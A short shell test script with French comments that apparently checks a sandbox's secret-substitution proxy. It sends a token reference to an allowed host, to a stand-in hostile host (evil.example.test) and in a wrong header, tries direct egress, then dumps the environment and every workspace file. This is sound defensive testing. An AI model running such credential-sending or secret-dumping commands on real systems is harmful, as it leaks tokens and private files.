#!/bin/sh
# Le bac à sable : réseau interne seulement, ne connaît que les références. Sortie analysée par run.sh.
. /workspace/.nokker/sandbox.env
echo "== autorisé"; curl -sS -D - https://api.example.test/ -H 'Authorization: Bearer secret:GH_TOKEN'; echo
echo "== hote_refuse"; curl -sS -o /dev/null -w '%{http_code}\n' https://evil.example.test/ -H 'Authorization: Bearer secret:GH_TOKEN'
echo "== emplacement_refuse"; curl -sS -o /dev/null -w '%{http_code}\n' https://api.example.test/ -H 'X-Other: secret:GH_TOKEN'
echo "== direct"; curl -sS --noproxy '*' -m 5 -o /dev/null -w '%{http_code}\n' https://api.example.test/ || echo "pas de sortie directe"
echo "== env"; env | sort
echo "== fichiers"; find /workspace -type f -exec cat {} +
